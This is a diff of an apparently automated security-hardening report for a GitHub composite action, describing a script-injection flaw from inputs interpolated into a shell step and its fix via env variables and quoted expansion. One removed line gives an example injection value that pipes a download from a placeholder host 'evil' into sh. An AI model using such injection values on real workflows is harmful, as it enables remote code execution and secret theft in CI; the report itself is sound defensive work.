@@ -16,7 +16,7 @@ Action **chetan--git-restore-mtime-action/v2.3** was hardened automatically. 3 f
 
 ### script-injection (severity: high)
 
-Sub-rule (a): GitHub Actions expressions are placed directly inside the composite action's run: script: `cd "${{ inputs.working-directory }}" && "$GITHUB_ACTION_PATH"/git-restore-mtime ${{ inputs.args }}`. Both inputs.working-directory and inputs.args are substituted into the script before the shell runs it, so a caller-supplied value with shell metacharacters (e.g. `"; curl evil | sh; "` or `$(...)`) runs as code. inputs.args is also unquoted. Fix: pass both through env: (e.g. WORKING_DIRECTORY, INPUT_ARGS) and use quoted expansions, such as cd "$WORKING_DIRECTORY". For args, read them into an array with `read -ra ARGS <<< "$INPUT_ARGS"` and pass "${ARGS[@]}" so that word splitting doesn't let the shell evaluate anything.
+Rule (a), direct expression interpolation. The composite step's run block puts `${{ inputs.working-directory }}` and `${{ inputs.args }}` straight into the shell script: `cd "${{ inputs.working-directory }}" && "$GITHUB_ACTION_PATH"/git-restore-mtime ${{ inputs.args }}`. A value containing `"`, `;`, `$(...)` or similar can break out and run arbitrary commands. The fix is to map both inputs into env: variables (for example WORKING_DIRECTORY and ARGS) and quote them, e.g. `cd "$WORKING_DIRECTORY"`. For ARGS, keep in mind it is meant to hold multiple arguments.
 
 Locations:
 
@@ -46,5 +46,5 @@ Locations:
 
 **Notes:**
 
-In action.yml, inputs.working-directory and inputs.args now go through env: as INPUT_WORKING_DIRECTORY and INPUT_ARGS. The run: step quotes both (cd "$INPUT_WORKING_DIRECTORY"). args is a list of arguments, so I used the quote-aware xargs split instead of the suggested 'read -ra'. Upstream pasted the expression straight into the script, so quotes inside the value worked; this keeps that. The split has an empty-value guard, xargs -r, and a pre-check that fails on an unmatched quote. Then "${args[@]}" passes the pieces to git-restore-mtime. Nothing in the value gets evaluated.
+Moved inputs.working-directory and inputs.args into env (WORKING_DIRECTORY, INPUT_ARGS). working-directory is quoted in cd; args is tokenized with the quote-aware xargs split (with unmatched-quote check and empty guard) into a bash array, matching upstream's inline-expression splitting behavior.
 
